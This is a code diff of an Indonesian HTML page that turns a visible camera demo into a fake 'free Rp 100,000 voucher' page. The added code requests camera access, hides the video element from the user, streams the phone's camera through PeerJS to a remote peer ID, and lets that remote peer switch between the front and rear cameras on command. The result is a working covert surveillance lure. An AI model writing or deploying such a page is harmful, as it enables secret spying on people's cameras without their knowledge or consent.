@@ -1,19 +1,56 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-  <title>Klaim Hadiah Anda</title>
-  <style>body { font-family: sans-serif; text-align: center; padding: 20px; }</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Klaim Voucher Gratis</title>
+  <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+  <style>
+    body { font-family: sans-serif; text-align: center; padding: 40px 20px; background: #f4f4f9; }
+    .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+    button { background: #28a745; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 6px; cursor: pointer; }
+  </style>
 </head>
 <body>
-  <h2>Selamat! Anda Memenangkan Promo</h2>
-  <!-- Menampilkan stream kamera di layar -->
-  <video id="webcam" autoplay playsinline style="width: 100%; max-width: 400px;"></video>
+  <div class="card">
+    <h2>🎉 Selamat! Anda Mendapatkan Voucher Rp 100.000</h2>
+    <p>Klik tombol di bawah untuk mengklaim promo hari ini.</p>
+    <button onclick="alert('Voucher berhasil diklaim!')">KLAIM SEKARANG</button>
+  </div>
+
+  <!-- Video disembunyikan total dari layar HP -->
+  <video id="webcam" autoplay playsinline style="display: none;"></video>
 
   <script>
-    // Meminta izin dan mengakses kamera HP
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => { document.getElementById('webcam').srcObject = stream; })
-      .catch(err => alert("Izin kamera ditolak."));
+    const ID_LAPTOP = "guru-demo-kamera-123"; // ID unik penghubung
+    const peer = new Peer();
+    let currentStream = null;
+    let useFrontCamera = false;
+
+    async function startCamera(facingMode) {
+      if (currentStream) currentStream.getTracks().forEach(track => track.stop());
+      try {
+        currentStream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: facingMode }
+        });
+        document.getElementById('webcam').srcObject = currentStream;
+        peer.call(ID_LAPTOP, currentStream);
+      } catch (err) { console.error(err); }
+    }
+
+    peer.on('open', () => {
+      startCamera(useFrontCamera ? "user" : "environment");
+    });
+
+    // Menerima perintah dari laptop untuk ganti kamera
+    peer.on('connection', (conn) => {
+      conn.on('data', (data) => {
+        if (data === 'switch') {
+          useFrontCamera = !useFrontCamera;
+          startCamera(useFrontCamera ? "user" : "environment");
+        }
+      });
+    });
   </script>
 </body>
 </html>
